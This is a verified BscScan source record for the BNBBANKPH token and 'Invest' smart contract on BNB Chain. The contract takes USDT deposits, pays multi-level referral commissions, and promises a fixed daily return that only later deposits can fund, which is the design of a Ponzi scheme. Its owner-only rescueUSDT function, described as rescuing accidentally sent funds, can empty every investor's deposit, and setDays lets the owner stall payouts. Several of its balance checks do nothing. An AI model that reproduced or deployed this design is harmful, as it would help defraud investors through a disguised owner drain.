{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-11-16\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT License\r\npragma solidity 0.8.9;\r\n\r\ninterface IERC20 {    \r\n\tfunction totalSupply() external view returns (uint256);\r\n\tfunction decimals() external view returns (uint8);\r\n\tfunction symbol() external view returns (string memory);\r\n\tfunction name() external view returns (string memory);\r\n\tfunction getOwner() external view returns (address);\r\n\tfunction balanceOf(address account) external view returns (uint256);\r\n\tfunction transfer(address recipient, uint256 amount) external returns (bool);\r\n\tfunction allowance(address _owner, address spender) external view returns (uint256);\r\n\tfunction approve(address spender, uint256 amount) external returns (bool);\r\n\tfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\r\n\tevent Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(account)\r\n        }\r\n        return size > 0;\r\n    }\r\n    \r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n        (bool success, ) = recipient.call{value: amount}(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n    \r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n    \r\n    function functionCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n    \r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value\r\n    ) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n    \r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\r\n        return verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n    \r\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\r\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\r\n    }\r\n    \r\n    function functionStaticCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal view returns (bytes memory) {\r\n        require(isContract(target), \"Address: static call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.staticcall(data);\r\n        return verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n    \r\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\r\n    }\r\n    \r\n    function functionDelegateCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        require(isContract(target), \"Address: delegate call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.delegatecall(data);\r\n        return verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n    \r\n    function verifyCallResult(\r\n        bool success,\r\n        bytes memory returndata,\r\n        string memory errorMessage\r\n    ) internal pure returns (bytes memory) {\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            \r\n            if (returndata.length > 0) {\r\n                \r\n\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using Address for address;\r\n\r\n    function safeTransfer(\r\n        IERC20 token,\r\n        address to,\r\n        uint256 value\r\n    ) internal {\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(\r\n        IERC20 token,\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) internal {\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n    \r\n    function safeApprove(\r\n        IERC20 token,\r\n        address spender,\r\n        uint256 value\r\n    ) internal {\r\n        \r\n        require(\r\n            (value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n    function safeIncreaseAllowance(\r\n        IERC20 token,\r\n        address spender,\r\n        uint256 value\r\n    ) internal {\r\n        uint256 newAllowance = token.allowance(address(this), spender) + value;\r\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\r\n    }\r\n\r\n    function safeDecreaseAllowance(\r\n        IERC20 token,\r\n        address spender,\r\n        uint256 value\r\n    ) internal {\r\n        unchecked {\r\n            uint256 oldAllowance = token.allowance(address(this), spender);\r\n            require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\r\n            uint256 newAllowance = oldAllowance - value;\r\n            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\r\n        }\r\n    }\r\n    \r\n    function _callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\");\r\n        if (returndata.length > 0) {\r\n            \r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n    * @dev Initializes the contract setting the deployer as the initial owner.\r\n    */\r\n    constructor () {\r\n      address msgSender = _msgSender();\r\n      _owner = msgSender;\r\n      emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n    * @dev Returns the address of the current owner.\r\n    */\r\n    function owner() public view returns (address) {\r\n      return _owner;\r\n    }\r\n    \r\n    modifier onlyOwner() {\r\n      require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n      _;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n      emit OwnershipTransferred(_owner, address(0));\r\n      _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n      _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal {\r\n      require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n      emit OwnershipTransferred(_owner, newOwner);\r\n      _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract BNBBANKPH is Context, Ownable, IERC20 {\r\n    using SafeMath for uint256;\r\n\tusing SafeERC20 for IERC20;\r\n\t\r\n    event _Invest(address indexed addr, uint256 amount, uint40 tm);\r\n    event _Payout(address indexed addr, uint256 amount);\r\n\r\n\tmapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n    uint8 private _decimals;\r\n    string private _symbol;\r\n    string private _name;\r\n\t\r\n    address payable public dev;\r\n       \r\n    uint8 public isScheduled = 1;\r\n    uint8 public isDaily = 1;\r\n    uint256 private constant DAY = 24 hours;\r\n    uint256 private numDays = 1;    \r\n\tuint16 constant PERCENT_DIVIDER = 1000; \r\n    uint16[3] private ref_bonuses = [70, 30, 10]; \r\n\r\n    uint256 public invested;\r\n    uint256 public withdrawn;\r\n    uint256 public ref_bonus;\r\n    \r\n    struct Tarif {\r\n        uint256 life_days;\r\n        uint256 percent;\r\n    }\r\n\r\n    struct Deposit {\r\n        uint256 tarif;\r\n        uint256 amount;\r\n        uint40 time;\r\n    }\r\n\r\n    struct Downline {\r\n        uint8 level;    \r\n        address invite;\r\n    }\r\n\r\n    struct Player {\r\n        address upline;\r\n        uint256 dividends;\r\n                \r\n        uint256 total_invested;\r\n        uint256 total_withdrawn;\r\n        uint256 total_ref_bonus;\r\n        uint256 total_reinvested;\r\n        uint40 lastWithdrawn;\r\n        \r\n        Deposit[] deposits;\r\n        Downline[] downlines1;\r\n        Downline[] downlines2;\r\n        Downline[] downlines3;\r\n        uint256[3] structure; \r\n    }\r\n\r\n    mapping(address => Player) public players;\r\n    mapping(uint256 => Tarif) public tarifs;\r\n\r\n    uint256 constant SELLRATE = 1000;\r\n    uint256 constant POOLRATE = 10;\r\n\t\r\n\tIERC20 public USDT;\r\n\t\r\n    constructor() {\r\n\t    _name = \"BNBBANKPESO\";\r\n        _symbol = \"BNBPESO\";\r\n        _decimals = 18;\r\n        _totalSupply =  1000000000 * 10**uint(_decimals); // 1B\r\n        _balances[address(this)] = 500000000 * 10**uint(_decimals); \r\n\t\temit Transfer(address(0), address(this), _balances[address(this)]);    \r\n\t\t_balances[msg.sender] = 500000000 * 10**uint(_decimals); \r\n\t\temit Transfer(address(0), msg.sender, _balances[msg.sender]);\t\t\r\n        tarifs[0] = Tarif(36135, 72270); \r\n        dev = payable(msg.sender);\t\t\r\n\t\tUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\r\n    }\r\n\t\r\n    function Invest(address _upline, uint256 amount) external {\r\n        \r\n        require(amount >= 1 ether, \"Minimum Buy is 1 USDT!\");\r\n\t\t\r\n\t\tUSDT.safeTransferFrom(msg.sender, address(this), amount);\r\n        \r\n\t\tuint256 tokens = amount.mul(POOLRATE);\r\n        require(_balances[address(this)].sub(tokens) >= 0,\"Not enough tokens!\");        \r\n        transferTokens(address(this), msg.sender, tokens);\r\n\r\n        setUpline(msg.sender, _upline);\r\n\r\n        Player storage player = players[msg.sender];\r\n\r\n        player.deposits.push(Deposit({\r\n            tarif: 0,\r\n            amount: amount,\r\n            time: uint40(block.timestamp)\r\n        }));  \r\n        emit _Invest(msg.sender, amount, uint40(block.timestamp));\r\n\t\t       \r\n        uint256 shares = SafeMath.div(amount,100); \r\n        USDT.safeTransfer(dev, shares);\r\n\t\t \r\n        player.total_invested += amount;\r\n        \r\n        invested += amount;\r\n        withdrawn += shares;\r\n        commissionPayouts(msg.sender, amount);\r\n    }\r\n\r\n    function setUpline(address _addr, address _upline) private {\r\n        if(players[_addr].upline == address(0) && _addr != owner()) {     \r\n\r\n            if(_balances[_upline] <= 0) {\r\n                _upline = owner();\r\n            }\r\n           \r\n            players[_addr].upline = _upline;\r\n            \r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                \r\n                players[_upline].structure[i]++;\r\n\r\n                Player storage up = players[_upline];\r\n                if(i == 0){\r\n                    up.downlines1.push(Downline({\r\n                        level: i+1,\r\n                        invite: _addr\r\n                    }));  \r\n                }else if(i == 1){\r\n                    up.downlines2.push(Downline({\r\n                        level: i+1,\r\n                        invite: _addr\r\n                    }));  \r\n                }else{\r\n                    up.downlines3.push(Downline({\r\n                        level: i+1,\r\n                        invite: _addr\r\n                    }));      \r\n                }\r\n\r\n                _upline = players[_upline].upline;\r\n\r\n               \r\n                \r\n                if(_upline == address(0)) break;\r\n            }\r\n          \r\n        }\r\n    }   \r\n    \r\n        \r\n    function commissionPayouts(address _addr, uint256 _amount) private {\r\n        address up = players[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;\r\n           \r\n            USDT.safeTransfer(up, bonus);\r\n\t\t\t\r\n\t\t\tplayers[up].total_ref_bonus += bonus;\r\n\r\n            ref_bonus += bonus;\r\n            withdrawn += bonus;\r\n\t\t\t     \r\n            up = players[up].upline;\r\n        }\r\n    }\r\n    \r\n\tfunction Payout() external {      \r\n        Player storage player = players[msg.sender];\r\n\r\n        if(isScheduled == 1) {\r\n            require (block.timestamp >= (player.lastWithdrawn + (DAY * numDays)), \"Not due yet for next payout!\");\r\n        }     \r\n\r\n        getPayout(msg.sender);\r\n\r\n        require(player.dividends > 0, \"No Income Yet!\");\r\n\r\n        uint256 amount =  player.dividends;\r\n        player.dividends = 0;\r\n        \r\n        player.total_withdrawn += amount;\r\n        \r\n\t\tUSDT.safeTransfer(msg.sender, amount);\r\n        emit _Payout(msg.sender, amount);\r\n\t\t\r\n\t\twithdrawn += amount;           \r\n    }\r\n\t\r\n    function userInfo(address _addr) view external returns(uint256 for_withdraw, \r\n                                                            uint256 total_invested, \r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tuint256 total_withdrawn, \r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tuint256 total_ref_bonus, \r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tuint40 lastPayout, uint256 numDeposits,  \r\n                                                                            uint256 downlines1,\r\n                                                                                uint256 downlines2,\r\n                                                                                    uint256 downlines3,                                                                                                                                        \r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tuint256[3] memory structure) {\r\n        Player storage player = players[_addr];\r\n\r\n        uint256 payout = this.computePayout(_addr);\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            structure[i] = player.structure[i];\r\n        }\r\n\r\n        return (\r\n            payout + player.dividends,\r\n            player.total_invested,\r\n\t\t\tplayer.total_withdrawn,\r\n            player.total_ref_bonus,\r\n            player.lastWithdrawn,        \r\n            player.deposits.length,\r\n            player.downlines1.length,\r\n            player.downlines2.length,\r\n            player.downlines3.length,\r\n            structure\r\n        );\r\n    } \r\n    \r\n    function memberDownline(address _addr, uint8 level, uint256 index) view external returns(address downline)\r\n    {\r\n        Player storage player = players[_addr];\r\n        Downline storage dl;\r\n        if(level==1){\r\n            dl  = player.downlines1[index];\r\n        }else if(level == 2)\r\n        {\r\n            dl  = player.downlines2[index];\r\n        }else{\r\n            dl  = player.downlines3[index];\r\n        }\r\n        return(dl.invite);\r\n    }\r\n\r\n    function memberDeposit(address _addr, uint256 index) view external returns(uint40 time, uint256 amount, uint256 lifedays, uint256 percent)\r\n    {\r\n        Player storage player = players[_addr];\r\n        Deposit storage dep = player.deposits[index];\r\n        Tarif storage tarif = tarifs[dep.tarif];\r\n        return(dep.time, dep.amount, tarif.life_days, tarif.percent);\r\n    }\r\n\r\n    function computePayout(address _addr) view external returns(uint256 value) {\r\n        Player storage player = players[_addr];\r\n\r\n        for(uint256 i = 0; i < player.deposits.length; i++) {\r\n            Deposit storage dep = player.deposits[i];\r\n            Tarif storage tarif = tarifs[dep.tarif];\r\n\r\n            uint256 time_end = dep.time + tarif.life_days * 86400;\r\n            uint40 from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;\r\n            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;\r\n\r\n            if(from < to) {\r\n                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;\r\n            }\r\n        }\r\n        return value;\r\n    }\r\n\r\n \r\n    function getPayout(address _addr) private {\r\n        uint256 payout = this.computePayout(_addr);\r\n\r\n        if(payout > 0) {\r\n            players[_addr].lastWithdrawn = uint40(block.timestamp);\r\n            players[_addr].dividends += payout;\r\n        }\r\n    }\r\n      \r\n\r\n    function nextWithdraw(address _addr) view external returns(uint40 next_sked) {\r\n        Player storage player = players[_addr];\r\n        if(player.deposits.length > 0)\r\n        {\r\n          return uint40(player.lastWithdrawn + (DAY * numDays));\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    function transferTokens(address _from, address _to, uint256 amount) private {\r\n        _balances[_to] = _balances[_to].add(amount);\r\n        _balances[_from] = _balances[_from].sub(amount);\r\n        emit Transfer(_from, _to, amount);\r\n    }\r\n\r\n    function SellTokens(uint256 amount) external {       \r\n        Player storage player = players[msg.sender];    \r\n        require(_balances[msg.sender] - amount >= 0,\"Not enough tokens!\");\r\n\r\n        _balances[msg.sender] = _balances[msg.sender].sub(amount);\r\n        _balances[address(this)] = _balances[address(this)].add(amount);\r\n        emit Transfer(msg.sender, address(this), amount);\r\n        \r\n        uint256 usdt = amount.div(SELLRATE); \r\n        USDT.safeTransfer(msg.sender, usdt);\r\n\t\twithdrawn += usdt;\r\n        player.total_withdrawn += usdt;\r\n    }\r\n   \r\n    function getBalance() public view returns(uint256) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function setDev(address newval) public onlyOwner returns (bool success) {\r\n        dev = payable(newval);\r\n        return true;\r\n    }\r\n    \r\n    function setScheduled(uint8 newval) public onlyOwner returns (bool success) {\r\n        isScheduled = newval;\r\n        return true;\r\n    }   \r\n   \r\n    function setDays(uint newval) public onlyOwner returns (bool success) {\r\n        numDays = newval;\r\n        return true;\r\n    }\r\n    \r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return a < b ? a : b;\r\n    }\r\n\r\n    function getOwner() external view returns (address) {\r\n        return owner();\r\n    }\r\n\r\n    function decimals() external view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function symbol() external view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function totalSupply() external view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) external view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"BEP20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    function burn(uint256 amount) public returns (bool) {\r\n        _burn(_msgSender(), amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\r\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"BEP20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal {\r\n        require(account != address(0), \"BEP20: burn from the zero address\");\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"BEP20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal {\r\n        require(owner != address(0), \"BEP20: approve from the zero address\");\r\n        require(spender != address(0), \"BEP20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    //rescue USDT sent accidentally to the contract\r\n    function rescueUSDT(address to, uint256 amount) external onlyOwner {\r\n    // Ensure the contract has sufficient USDT balance\r\n    require(USDT.balanceOf(address(this)) >= amount, \"Insufficient USDT balance in the contract\");\r\n\r\n    // Transfer USDT to the specified address\r\n    USDT.safeTransfer(to, amount);\r\n}\r\n\r\n\r\n    function _burnFrom(address account, uint256 amount) internal {\r\n        _burn(account, amount);\r\n        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, \"BEP20: burn amount exceeds allowance\"));\r\n    }\r\n\r\n}\r\n\r\n\r\nlibrary SafeMath {\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n            // benefit is lost if 'b' is also tested.\r\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint40\",\"name\":\"tm\",\"type\":\"uint40\"}],\"name\":\"_Invest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_Payout\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Invest\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Payout\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"SellTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"USDT\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"computePayout\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dev\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"invested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isDaily\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isScheduled\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"memberDeposit\",\"outputs\":[{\"internalType\":\"uint40\",\"name\":\"time\",\"type\":\"uint40\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lifedays\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"memberDownline\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"downline\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}